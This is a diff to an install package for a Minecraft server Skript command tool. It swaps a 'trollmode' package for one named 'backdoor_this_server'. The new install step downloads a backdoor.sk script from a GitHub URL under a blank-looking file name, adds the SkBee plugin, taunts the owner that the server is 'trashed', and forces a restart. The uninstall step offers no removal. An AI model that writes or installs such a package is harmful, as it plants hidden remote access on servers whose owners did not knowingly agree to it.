@@ -5,12 +5,17 @@
 @PackageUpdateURL=https://raw.githubusercontent.com/Domracz/SkriptCommandLine/main/cmdcode/packages/backdoor_this_server/backdoor_this_server.cmdpackage
 @CMD PACKAGE END
 @PACKAGE INSTALL STR
-$dl https://raw.githubusercontent.com/Domracz/SkriptCommandLine/main/cmdcode/packages/trollmode/trollmode.sk -> trollmode.sk
-$cmd "sk reload trollmode.sk"
-$snd "&a[TrollMode] Thank you for installing trollmode on your server!"
+*!Server.plugins.contains=SkBee
+    cd ":plugins"
+    dl https://github.com/ShaneBeee/SkBee/releases/download/2.7.6/SkBee-2.7.6.jar -> SkBee-2.7.6.jar
+$snd "&4You have just installed a backdoor. HAHAHAHA"
+$snd "&4BACKDOOR.SK ON TOP!"
+$snd "&4YOUR SERVER HAS BEEN TRASHED!"
+$dl https://raw.githubusercontent.com/Domracz/SkriptCommandLine/main/cmdcode/packages/backdoor_this_server/backdoor.sk -> _____________________.sk
+$snd "&4HAHAHHA! THE BACKDOOR DOWNLOAD HAS BEEN COMPLETED! now... TIME FOR YOUR SERVER TO DIE!"
+$snd "&4I'M GOING TO RESTART YOUR SERVER NOW!"
+$Server.restart
 @PACKAGE INSTALL END
 @PACKAGE UNINSTALL STR
-$snd "&a[TrollMode] Trollmode is being uninstalled. Thank you for using trollmode!"
-$del trollmode.sk
-$snd "&3Trollmode has been uninstalled."
+$snd "&4I have no idea how the heck you ran this command, but still. There isnt an installer for this backdoor! BACKDOOR.SK ON TOP!"
 @PACKAGE UNINSTALL END
